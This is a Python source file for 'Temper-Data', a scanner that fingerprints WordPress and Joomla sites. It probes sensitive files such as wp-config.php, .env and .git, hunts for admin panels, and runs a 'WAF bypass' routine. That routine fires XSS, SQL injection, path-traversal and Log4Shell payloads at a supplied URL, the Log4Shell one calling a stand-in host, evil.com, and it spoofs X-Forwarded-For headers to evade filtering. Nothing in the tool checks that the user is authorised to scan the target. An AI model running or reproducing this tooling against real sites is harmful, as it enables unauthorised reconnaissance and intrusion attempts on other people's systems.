#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Temper-Data - Advanced Security Scanner for CMS Platforms
Author: SayerLinux
Email: SayerLinux@gmail.com
GitHub: https://github.com/SaudiLinux
Description: Powerful security tool for Joomla/WordPress vulnerability detection,
hidden URL discovery, admin panel detection, and WAF bypass capabilities.
"""

import requests
import argparse
import threading
import socket
import json
import time
import random
import re
import urllib3
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
import colorama
from colorama import Fore, Back, Style
import sys

# Initialize colorama for Windows
if sys.platform.startswith('win'):
    colorama.init()

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TemperData:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.results = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                        Temper-Data v2.0                      ║
║         Advanced CMS Security Scanner & WAF Bypass           ║
║                                                              ║
║  Author: {Fore.GREEN}SayerLinux{Fore.CYAN}                                    ║
║  GitHub: {Fore.GREEN}https://github.com/SaudiLinux{Fore.CYAN}               ║
║  Email: {Fore.GREEN}SayerLinux@gmail.com{Fore.CYAN}                         ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)
    
    def get_random_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def detect_cms(self, url):
        """Detect if target is Joomla or WordPress"""
        try:
            # Joomla detection
            joomla_paths = [
                '/administrator/manifests/files/joomla.xml',
                '/administrator/language/en-GB/en-GB.xml',
                '/language/en-GB/en-GB.xml'
            ]
            
            # WordPress detection
            wp_paths = [
                '/wp-login.php',
                '/wp-admin/',
                '/wp-content/themes/',
                '/wp-includes/js/'
            ]
            
            cms_type = None
            
            # Check WordPress
            for wp_path in wp_paths:
                response = self.session.get(urljoin(url, wp_path), headers=self.get_random_headers())
                if response.status_code == 200:
                    cms_type = 'WordPress'
                    break
            
            # Check Joomla
            if not cms_type:
                for joomla_path in joomla_paths:
                    response = self.session.get(urljoin(url, joomla_path), headers=self.get_random_headers())
                    if response.status_code == 200 and 'joomla' in response.text.lower():
                        cms_type = 'Joomla'
                        break
            
            return cms_type
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error detecting CMS: {e}{Style.RESET_ALL}")
            return None
    
    def scan_vulnerabilities(self, url, cms_type):
        """Scan for common vulnerabilities based on CMS type"""
        vulnerabilities = []
        
        if cms_type == 'WordPress':
            vuln_paths = [
                '/wp-admin/admin-ajax.php',
                '/wp-json/wp/v2/users',
                '/wp-content/plugins/',
                '/wp-content/themes/',
                '/xmlrpc.php',
                '/wp-config.php'
            ]
        elif cms_type == 'Joomla':
            vuln_paths = [
                '/administrator/index.php',
                '/index.php?option=com_users&view=registration',
                '/index.php?option=com_content&view=article&id=1',
                '/configuration.php',
                '/administrator/manifests/files/joomla.xml'
            ]
        else:
            return vulnerabilities
        
        for path in vuln_paths:
            try:
                full_url = urljoin(url, path)
                response = self.session.get(full_url, headers=self.get_random_headers())
                
                if response.status_code == 200:
                    if 'users' in path and 'json' in response.headers.get('content-type', ''):
                        vulnerabilities.append({
                            'type': 'User Enumeration',
                            'url': full_url,
                            'severity': 'Medium',
                            'description': f'User enumeration possible at {full_url}'
                        })
                    elif 'xmlrpc' in path:
                        vulnerabilities.append({
                            'type': 'XML-RPC Enabled',
                            'url': full_url,
                            'severity': 'High',
                            'description': 'XML-RPC interface is accessible'
                        })
                    else:
                        vulnerabilities.append({
                            'type': 'Accessible Path',
                            'url': full_url,
                            'severity': 'Low',
                            'description': f'Accessible path discovered: {path}'
                        })
                        
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def discover_hidden_urls(self, url):
        """Discover hidden URLs using common wordlists"""
        hidden_urls = []
        
        common_paths = [
            'admin', 'administrator', 'backup', 'old', 'test', 'dev', 'staging',
            'config', 'logs', 'temp', 'tmp', 'uploads', 'files', 'downloads',
            'wp-admin', 'administrator', 'panel', 'dashboard', 'control',
            '.env', '.git', '.svn', 'robots.txt', 'sitemap.xml', 'crossdomain.xml'
        ]
        
        extensions = ['', '.php', '.html', '.htm', '.txt', '.bak', '.old', '.orig']
        
        for path in common_paths:
            for ext in extensions:
                try:
                    test_url = urljoin(url, f"{path}{ext}")
                    response = self.session.get(test_url, headers=self.get_random_headers())
                    
                    if response.status_code == 200:
                        hidden_urls.append({
                            'url': test_url,
                            'status': response.status_code,
                            'size': len(response.content)
                        })
                    elif response.status_code == 403:
                        hidden_urls.append({
                            'url': test_url,
                            'status': response.status_code,
                            'note': 'Forbidden - may exist'
                        })
                        
                except Exception:
                    continue
                    
        return hidden_urls
    
    def detect_admin_panel(self, url, cms_type):
        """Detect admin panel locations"""
        admin_panels = []
        
        if cms_type == 'WordPress':
            admin_urls = [
                '/wp-admin/',
                '/wp-login.php',
                '/admin/',
                '/login/',
                '/administrator/'
            ]
        elif cms_type == 'Joomla':
            admin_urls = [
                '/administrator/',
                '/admin/',
                '/login/',
                '/administrator/index.php'
            ]
        else:
            admin_urls = [
                '/admin/',
                '/administrator/',
                '/login/',
                '/panel/',
                '/dashboard/',
                '/admin.php',
                '/admin.html'
            ]
        
        for admin_url in admin_urls:
            try:
                full_url = urljoin(url, admin_url)
                response = self.session.get(full_url, headers=self.get_random_headers())
                
                if response.status_code == 200:
                    # Check if it looks like an admin panel
                    admin_indicators = [
                        'login', 'admin', 'password', 'username', 'dashboard',
                        'panel', 'control', 'manage', 'sign in', 'signin'
                    ]
                    
                    content_lower = response.text.lower()
                    if any(indicator in content_lower for indicator in admin_indicators):
                        admin_panels.append({
                            'url': full_url,
                            'status': response.status_code,
                            'type': cms_type or 'Generic'
                        })
                        
            except Exception:
                continue
                
        return admin_panels
    
    def waf_bypass_techniques(self, url):
        """Attempt WAF bypass using various techniques"""
        bypass_results = []
        
        # Common WAF bypass payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "' OR 1=1--",
            "../../../etc/passwd",
            "<img src=x onerror=alert(1)>",
            "${jndi:ldap://evil.com/a}",
            "<svg onload=alert(1)>"
        ]
        
        # Bypass techniques
        techniques = [
            {'name': 'Standard', 'headers': {}},
            {'name': 'Random UA', 'headers': {'User-Agent': random.choice(self.user_agents)}},
            {'name': 'IP Spoofing', 'headers': {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'}},
            {'name': 'Mobile UA', 'headers': {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'}}
        ]
        
        for payload in payloads:
            for tech in techniques:
                try:
                    headers = self.get_random_headers()
                    headers.update(tech['headers'])
                    
                    # Test on search parameter
                    test_url = f"{url}?search={payload}"
                    response = self.session.get(test_url, headers=headers)
                    
                    if response.status_code == 200 and payload in response.text:
                        bypass_results.append({
                            'payload': payload,
                            'technique': tech['name'],
                            'status': 'Bypass Successful',
                            'url': test_url
                        })
                    elif response.status_code != 403:
                        bypass_results.append({
                            'payload': payload,
                            'technique': tech['name'],
                            'status': f'Response: {response.status_code}',
                            'url': test_url
                        })
                        
                except Exception:
                    continue
                    
        return bypass_results
    
    def save_results(self, filename=None):
        """Save scan results to JSON file with automatic naming"""
        if filename is None:
            # Generate automatic filename with timestamp
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            filename = f"temper-data-results_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"{Fore.GREEN}[+] Results automatically saved to {filename}{Style.RESET_ALL}")
            return filename
        except Exception as e:
            print(f"{Fore.RED}[!] Error saving results: {e}{Style.RESET_ALL}")
            return None
    
    def auto_save_results(self, target_url):
        """Automatically save results after each scan"""
        if self.results:
            # Create filename from URL and timestamp
            parsed_url = urlparse(target_url)
            domain = parsed_url.netloc.replace(':', '_').replace('/', '_')
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            filename = f"temper-data_{domain}_{timestamp}.json"
            return self.save_results(filename)
        return None
    
    def run_scan(self, target_url, auto_save=True):
        """Run complete security scan"""
        print(f"{Fore.YELLOW}[*] Starting security scan for: {target_url}{Style.RESET_ALL}")
        
        # Validate URL
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        # Detect CMS
        cms_type = self.detect_cms(target_url)
        if cms_type:
            print(f"{Fore.GREEN}[+] Detected CMS: {cms_type}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] CMS type not detected, using generic scan{Style.RESET_ALL}")
        
        # Run all scans
        vulnerabilities = self.scan_vulnerabilities(target_url, cms_type)
        hidden_urls = self.discover_hidden_urls(target_url)
        admin_panels = self.detect_admin_panel(target_url, cms_type)
        waf_bypass = self.waf_bypass_techniques(target_url)
        
        # Compile results
        scan_result = {
            'target': target_url,
            'cms_type': cms_type,
            'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': vulnerabilities,
            'hidden_urls': hidden_urls,
            'admin_panels': admin_panels,
            'waf_bypass_attempts': waf_bypass
        }
        
        self.results.append(scan_result)
        
        # Display results
        self.display_results(scan_result)
        
        # Auto-save results if enabled
        if auto_save:
            saved_file = self.auto_save_results(target_url)
            if saved_file:
                print(f"{Fore.GREEN}[+] Results automatically saved to: {saved_file}{Style.RESET_ALL}")
        
        return scan_result
    
    def display_results(self, result):
        """Display scan results in formatted way"""
        print(f"\n{Fore.CYAN}═══════════════════ SCAN RESULTS ═══════════════════{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}Target: {result['target']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}CMS Type: {result['cms_type'] or 'Unknown'}{Style.RESET_ALL}")
        
        # Vulnerabilities
        print(f"\n{Fore.YELLOW}[+] Vulnerabilities Found: {len(result['vulnerabilities'])}{Style.RESET_ALL}")
        for vuln in result['vulnerabilities']:
            severity_color = Fore.RED if vuln['severity'] == 'High' else Fore.YELLOW if vuln['severity'] == 'Medium' else Fore.WHITE
            print(f"  {severity_color}• {vuln['type']} - {vuln['severity']}{Style.RESET_ALL}")
            print(f"    URL: {vuln['url']}")
        
        # Hidden URLs
        print(f"\n{Fore.YELLOW}[+] Hidden URLs Discovered: {len(result['hidden_urls'])}{Style.RESET_ALL}")
        for hidden in result['hidden_urls'][:5]:  # Show first 5
            print(f"  • {hidden['url']} ({hidden['status']})")
        
        # Admin Panels
        print(f"\n{Fore.YELLOW}[+] Admin Panels Found: {len(result['admin_panels'])}{Style.RESET_ALL}")
        for panel in result['admin_panels']:
            print(f"  • {panel['url']} ({panel['type']})")
        
        # WAF Bypass
        print(f"\n{Fore.YELLOW}[+] WAF Bypass Results: {len(result['waf_bypass_attempts'])}{Style.RESET_ALL}")
        successful = [b for b in result['waf_bypass_attempts'] if 'Successful' in b['status']]
        if successful:
            print(f"{Fore.RED}[!] Successful bypasses: {len(successful)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════{Style.RESET_ALL}")

def main():
    scanner = TemperData()
    scanner.print_banner()
    
    parser = argparse.ArgumentParser(description='Temper-Data - Advanced CMS Security Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--no-auto-save', action='store_true', help='Disable automatic result saving')
    
    args = parser.parse_args()
    
    try:
        # Run scan with auto-save based on --no-auto-save flag
        auto_save = not args.no_auto_save
        result = scanner.run_scan(args.url, auto_save=auto_save)
        
        # Handle manual output if specified
        if args.output:
            scanner.save_results(args.output)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error during scan: {e}{Style.RESET_ALL}")

if __name__ == '__main__':
    main()